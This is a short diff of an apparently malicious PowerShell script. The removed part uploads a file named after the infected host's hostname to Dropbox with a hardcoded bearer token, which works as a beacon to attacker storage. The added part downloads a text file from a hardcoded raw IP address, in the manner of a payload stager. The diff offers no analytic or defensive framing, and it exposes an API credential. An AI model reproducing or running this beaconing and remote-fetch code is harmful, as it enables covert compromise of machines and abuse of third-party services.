@@ -1,33 +1,4 @@
-function Invoke-Webclient{
-    param(        
-        [String]$Body = "",
-        [String]$Header = ""
-    )
-    $WebRequest = [System.Net.WebRequest]::Create('https://content.dropboxapi.com/2/files/upload')
-    $WebRequest.Method = "Post"
-    $WebRequest.ContentType = "application/octet-stream"
-    $PostStr = [System.Text.Encoding]::UTF8.GetBytes($Body)
-    
-    $WebRequest.ContentLength = $PostStr.Length
-    $WebRequest.Headers.Add("Authorization", "Bearer bkui_hwQ3XAAAAAAAAAAChO0V1EdSy7q6Ccyh8NzaVuGEn5tr4r1ZCxqdpsBzRbq")
-    $Head = $Header.SubString(0,($Header.IndexOf(":")))
-    $Value = $Header.SubString(($Header.IndexOf(":") + 1))
-    $WebRequest.Headers.Add($Head, $Value)
-
-
-    $requestStream = $WebRequest.GetRequestStream()
-    $requestStream.Write($PostStr, 0,$PostStr.length)
-    $requestStream.Close()
-
-    $Response = $WebRequest.GetResponse()
-    $ResponseStream = $Response.GetResponseStream()
-    $ReadStream = New-Object System.IO.StreamReader $ResponseStream
-    $Data=$ReadStream.ReadToEnd()
-    $Data
-
-}
-$hostname = hostname
-$path_inet = "/" + $hostname + ".csv"
-$header = 'Dropbox-API-Arg: {"path": "' + $path_inet + '","mode": "add","autorename": true,"mute": false}'
-$content = 'test'
-Invoke-Webclient -Header $header -Body $content | Out-null
+$WebRequest = [System.Net.WebRequest]::Create("http://5.133.11.174/LICENSESES.txt");
+$WebRequest.Method = "Get";
+$ReadStream = New-Object System.IO.StreamReader $WebRequest.GetResponse().GetResponseStream();
+$Data=$ReadStream.ReadToEnd();
